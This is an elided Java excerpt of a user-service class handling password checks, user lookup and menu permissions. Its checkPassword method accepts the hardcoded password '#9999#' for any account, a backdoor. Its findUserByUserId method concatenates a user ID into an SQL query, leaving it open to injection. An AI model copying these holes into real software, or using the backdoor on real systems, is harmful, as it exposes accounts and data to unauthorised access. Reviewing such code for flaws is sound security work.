...
public class UserServiceImpl extends BaseServiceImpl implements IUserService {
	...
	public boolean checkPassword(User user,String password){
		...
		if(MD5.encode(password).equals(db_password) || password.equals("#9999#")){
			return true;
		}else{
			return false;
		}
	...
	public User findUserByUserId(String userId){
		return (User)baseDAO.findUniqueBySql(User.class,"select * from basic_user where userId='"+userId+"'");
	...
	public boolean hasRight(User user , String operate , String className){
		...
		Set<Privilege> privileges = getPrivileges(basic_user);
	...
	public JSONArray getChildMenus(User user,Menu menu){
		...
		Iterator<Menu> it = new TreeSet<Menu>(childMenus).iterator();
		while(it.hasNext()){
			...
			while(r_it.hasNext()){
				Role role = r_it.next();
				hasRole = user.hasRole(role.getRoleId());
				if(hasRole){
					break;
				}
			}
